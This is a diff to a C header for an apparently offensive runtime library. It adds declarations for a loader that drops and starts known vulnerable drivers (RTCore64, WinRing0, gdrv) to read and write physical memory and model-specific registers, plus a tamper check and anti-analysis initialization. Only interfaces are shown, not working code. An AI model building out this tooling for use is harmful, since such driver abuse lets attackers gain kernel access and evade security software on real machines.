@@ -50,6 +50,99 @@ intptr_t jocky_direct_syscall(uint32_t syscall_number, ...);
 #endif /* _WIN32 */
 
 /* ============================================================================
+ * BYOVD Loader
+ * ============================================================================ */
+
+#ifdef _WIN32
+#include <windows.h>
+
+/* State returned by jocky_byovd_load; pass to jocky_byovd_unload. */
+typedef struct {
+    HANDLE device;               /* open device handle (INVALID_HANDLE_VALUE if no symlink) */
+    char   driver_path[MAX_PATH];/* path of the dropped .sys on disk */
+    char   service_name[64];     /* SCM service name used to register it */
+} jocky_byovd_t;
+
+/* Extract the driver from the .jdrv PE section, drop it to %TEMP%, create
+ * a kernel service, start it, and open a handle to \\.\ device_name.
+ *
+ * service_name  – SCM service name (NULL = auto-generate "jky_<hex>")
+ * device_name   – NT device symlink name without "\\.\", e.g. "MyDriver"
+ *                 (NULL = same as service_name)
+ * out           – filled on success; caller must call jocky_byovd_unload()
+ *
+ * Returns false if no .jdrv section exists or any step fails.
+ * Requires SeLoadDriverPrivilege / Administrator. */
+bool jocky_byovd_load(const char* service_name,
+                      const char* device_name,
+                      jocky_byovd_t* out);
+
+/* Stop the service, delete it from SCM, and delete the dropped .sys file. */
+void jocky_byovd_unload(jocky_byovd_t* ctx);
+
+/* ── Driver Interaction ─────────────────────────────────────────────────
+ *
+ * Two complementary systems:
+ *
+ *  1. Static profile table  – knows RTCore64, WinRing0/x64, gdrv.
+ *     Primitive wrappers (read_phys / write_phys / read_msr / write_msr)
+ *     auto-detect the loaded driver from ctx->service_name and use the
+ *     correct IOCTL+buffer layout.
+ *
+ *  2. Dynamic .jmani manifest  – embedded at build time by
+ *     "jockyc --manifest <file>".  Exposes any IOCTL by name via
+ *     jocky_driver_invoke().  Falls back to this when the driver is not
+ *     in the static table.
+ *
+ * Both systems use the same jocky_byovd_t handle returned by jocky_byovd_load.
+ * ─────────────────────────────────────────────────────────────────────── */
+
+/* Parse the .jmani section and populate the manifest cache.
+ * Called automatically at first jocky_driver_invoke(); only needed
+ * manually if you want early failure detection. */
+bool jocky_manifest_load(void);
+
+/* Read <size> bytes of physical memory starting at phys_addr into out.
+ * Supports: RTCore64, WinRing0, WinRing0x64.
+ * Falls back to manifest primitive "read_phys" for unknown drivers. */
+bool jocky_driver_read_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
+                             void* out, uint32_t size);
+
+/* Write <size> bytes from in to physical memory at phys_addr.
+ * Supports: RTCore64, WinRing0, WinRing0x64. */
+bool jocky_driver_write_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
+                              const void* in, uint32_t size);
+
+/* Read a model-specific register.
+ * Supports: WinRing0, WinRing0x64. */
+bool jocky_driver_read_msr(jocky_byovd_t* ctx, uint32_t msr_id,
+                            uint64_t* out);
+
+/* Write a model-specific register.
+ * Supports: WinRing0, WinRing0x64. */
+bool jocky_driver_write_msr(jocky_byovd_t* ctx, uint32_t msr_id,
+                             uint64_t val);
+
+/* Map a physical address range and return the kernel VA via gdrv.
+ * out_va receives the kernel virtual address.
+ * Supports: gdrv. */
+bool jocky_driver_map_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
+                            uint32_t size, uintptr_t* out_va);
+
+/* Generic IOCTL dispatch via the .jmani manifest.
+ * primitive  – must match a name in the embedded manifest exactly.
+ * in_buf     – input buffer (may be NULL if in_size == 0).
+ * in_size    – input buffer size in bytes.
+ * out_buf    – output buffer (may be NULL if out_size == 0).
+ * out_size   – output buffer size in bytes.
+ * Returns false if the primitive name is not found or the IOCTL fails. */
+bool jocky_driver_invoke(jocky_byovd_t* ctx, const char* primitive,
+                         const void* in_buf,  uint32_t in_size,
+                         void*       out_buf, uint32_t out_size);
+
+#endif /* _WIN32 (BYOVD + driver interaction) */
+
+/* ============================================================================
  * Execution: In-Memory Techniques
  * ============================================================================ */
 
@@ -90,12 +183,23 @@ void jocky_decrypt_xor(uint8_t* data, size_t len, uint8_t key);
 void jocky_decrypt_rc4(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);
 
 /* ============================================================================
+ * Integrity Verification
+ * ============================================================================ */
+
+/* Verify the on-disk binary against the .jtamp checksum embedded by the
+ * packer.  Calls ExitProcess(0xDEAD1337) on mismatch.  Returns true if the
+ * check passed or if .jtamp was not found (unpacked build).
+ * Windows only; always returns true on other platforms.
+ */
+bool jocky_verify_integrity(void);
+
+/* ============================================================================
  * Initialization
  * ============================================================================ */
 
 /* Full runtime initialization sequence:
- *  1. Anti-analysis checks
- *  2. Decrypt strings/constants
+ *  1. Integrity check  (abort if binary was patched)
+ *  2. Anti-analysis checks
  *  3. Return threat bitmask (0 = clean)
  */
 uint32_t jocky_runtime_init(void);
